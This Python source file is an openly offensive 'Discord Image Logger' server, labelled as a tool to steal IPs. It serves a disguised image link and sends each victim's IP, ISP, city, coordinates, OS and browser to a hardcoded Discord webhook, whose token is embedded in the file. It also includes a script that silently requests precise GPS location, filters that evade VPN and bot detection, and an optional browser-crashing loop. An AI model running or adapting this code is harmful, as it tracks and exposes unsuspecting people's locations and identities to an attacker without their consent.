# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1438547287826759851/FS9C4Lr0x8rrtr63ETZGC5sqxFwz9ZUcAzOglS3Pnyq5pw8Wwwb5jlHd195nVMcuX-Jh",
    "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQ0AAAC7CAMAAABIKDvmAAAAV1BMVEUsMTcsMT0sMTosMTksMT4uM0F3gMV0fcAqLzRFSmg7QFdZYItqcqlweLVQVnstMjw0OUs+Q11rc65LUXNye7syN0Z5gsliaps0OU1FS2lBRmFcY5RTWoIuWrO8AAABuElEQVR4nO3Y62rbMBQAYEtynFsTpcmyplne/zknNzW2GeuPwTBU30cw5IDBOhzdTtMAAAAAAAAAAAAAAAAAAAAAAAAAAAD8m5RijP1zGswxpqU+aEkp5RRiDDmkWTRVmY2Si9A2q/LMk2ioMhf9uMPwm0Svr7u0WeyblhNCDE9DpCwZcXs+X3bxq/e+pxjalOfZyOG679bdS43pWH3WRjvMlPL//mO9Xh+2q0U/bAl5mCqTQrjuf5baeLtVVxv9JEn9JBnPFymsdse37vwe8xcvfku5pKOcOPpTxxCKfbWcjpdThZtKzLkspMVYGzk3abOqrjBGlR49Af6jKtfVVC6v+c/tNI5H9ZqUu3zYzA7mzec1rr5rSimC2+7+mF7fU2w/cjHv/1Qi7V8O3WE7jryczJ+1UWM2Nr+6cn0/jrVRstE8E1JhNppjn43HZOR5qI0Ku6Pp/dB13X6yin6URZz1w6qRbsfH5X6abSD9VCl1kSrcZPNp17azNlfKsb/m1zhVUowhltFPQqFpc2xjyBXWxrO3MRt33yxNJaTr0UtRHgAAAAAAAAAAAAAAAAAAAAAAAAAA+JvfMQ8I2dr7na4AAAAASUVORK5CYII=", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger bot", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Enable the custom message?
        "message": "you just got hacked by b0y8 have a nice day!", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "data:image/png;base64,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" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
